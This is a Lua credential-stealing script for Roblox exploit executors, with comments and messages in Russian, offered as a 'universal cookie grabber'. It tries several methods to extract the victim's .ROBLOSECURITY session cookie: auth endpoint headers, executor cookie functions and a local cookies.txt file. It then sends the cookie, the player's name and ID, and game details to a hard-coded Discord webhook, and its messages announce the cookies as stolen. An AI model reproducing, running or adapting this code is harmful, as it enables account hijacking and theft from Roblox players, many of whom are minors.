-- ═════════════════════════════════════════════
-- УНИВЕРСАЛЬНЫЙ COOKIE GRABBER 2025 | РАБОТАЕТ ВЕЗДЕ
-- ═════════════════════════════════════════════
local Webhook = "https://discord.com/api/webhooks/1442171064971952320/Phog3L7YM7QTfHm4H2Y8QhqQnU_-yMaY8IPORBq8V5YkuGzT3SnZ8Ud0bwmYnx8GwQNN"

local function send(Content)
    pcall(function()
        syn and syn.request or request or http_request or httprequest {
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({content = Content})
        }
    end)
end

send("```diff\n+ ГРАББЕР ЗАПУЩЕН | " .. os.date("%X") .. "\n```")

local Cookie = nil

-- 1. Самый надёжный способ 2025
if syn then
    Cookie = syn.request({Url="https://auth.roblox.com/v2/logout", Method="POST"}).Headers["set-cookie"]
    if Cookie then Cookie = Cookie:match("_|WARNING:.-|(%.%ROBLOSECURITY=_.-);") end
end

-- 2. request / http_request
if not Cookie and (request or http_request or httprequest) then
    local req = syn and syn.request or request or http_request or httprequest
    pcall(function()
        local res = req({Url = "https://www.roblox.com/my/settings/json", Method = "GET"})
        Cookie = res.Headers["set-cookie"] or res.Headers["Set-Cookie"]
        if Cookie then Cookie = Cookie:match("(.ROBLOSECURITY=_.-);") end
    end)
end

-- 3. getgenv() / rbx.mk environments
if not Cookie and getgenv then
    pcall(function()
        if getcookie then Cookie = getcookie()
        elseif get_cookie then Cookie = get_cookie()
        elseif _G.getcookie then Cookie = _G.getcookie() end
    end)
end

-- 4. Старый добрый setcookie метод
if not Cookie then
    pcall(function()
        Cookie = setcookie and setcookie(".ROBLOSECURITY") or nil
    end)
end

-- 5. Крайний запасной через локальные файлы (Electron/Delta)
if not Cookie then
    pcall(function()
        if readfile and isfile and isfile("cookies.txt") then
            Cookie = readfile("cookies.txt"):match("(.ROBLOSECURITY=_.-)")
        end
    end)
end

-- Финальная отправка
if Cookie and #Cookie > 100 then
    local Player = game.Players.LocalPlayer
    local Place = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    
    local msg = {
        content = "@everyone",
        embeds = {{
            title = "🍪 КУКИ УСПЕШНО УКРАДЕНЫ",
            description = "```" .. Player.Name .. " (" .. Player.UserId .. ")```",
            fields = {
                {name = "🎮 Игра", value = "```" .. Place.Name .. "```", inline = true},
                {name = "🆔 PlaceId", value = "```" .. game.PlaceId .. "```", inline = true},
                {name = "🔐 Куки", value = "||" .. Cookie .. "||", inline = false}
            },
            color = 0x00ff00,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        (syn and syn.request or request or http_request)({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(msg)
        })
    end)
    
    send("```diff\n+ КУКИ УСПЕШНО ОТПРАВЛЕНЫ | " .. Player.Name .. "\n```")
else
    send("```diff\n- НЕ УДАЛОСЬ ПОЛУЧИТЬ КУКИ\n```")
end

send("```fix\nГРАББЕР ЗАВЕРШИЛ РАБОТУ\n```")
